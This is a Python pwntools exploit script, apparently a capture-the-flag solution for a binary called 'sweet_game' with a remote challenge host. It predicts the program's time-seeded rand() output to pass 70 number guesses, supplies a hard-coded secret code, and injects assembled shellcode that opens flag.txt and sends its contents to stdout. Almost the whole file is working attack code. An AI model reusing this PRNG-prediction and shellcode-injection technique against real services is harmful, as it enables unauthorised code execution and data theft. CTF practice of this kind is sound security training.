#!/usr/bin/env python3
from pwn import *
from ctypes import CDLL
import time

# =========================================================
#                          SETUP                         
# =========================================================
exe = './sweet_game'
elf = context.binary = ELF(exe, checksec=True)
#libc = './libc.so.6'
#libc = ELF(libc, checksec=False)
lib = CDLL("/lib/x86_64-linux-gnu/libc.so.6")
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = '103.145.226.92', 24234

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        context.log_level = 'info'
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg

'''.format(**locals())


# =========================================================
#                         EXPLOITS
# =========================================================
#┌──(kali㉿kali)-[~/Windows/Sweet Game]
#└─$ pwn checksec sweet_game   
#[*] '/home/kali/Windows/Sweet Game/sweet_game'
#    Arch:       amd64-64-little
#    RELRO:      Full RELRO
#    Stack:      No canary found
#    NX:         NX enabled
#    PIE:        PIE enabled

def gen_rand():
    v3 = (lib.rand() + 8) % 20 + 1
    return v3

def guess(i):
    io.sendlineafter(b"Choose a number from 1 to 20:", str(i))

def exploit():
    global io
    io = initialize()
    lib.srand(lib.time(None))
    io.sendline("hazy")
    io.sendlineafter(b"Enter the secret code to proceed: ", p64(0x69747563737975))
    for _ in range(70):
      guess(gen_rand())
    pause() if args.GDB else None
    shellcode = shellcraft.linux.openat(-100, "flag.txt")
    shellcode += shellcraft.linux.sendfile(1, 'rax', 0, 500)
    io.sendlineafter(b'Give us your feedbacks for this game: ', asm(shellcode))
    io.interactive()
    
if __name__ == '__main__':
    exploit()
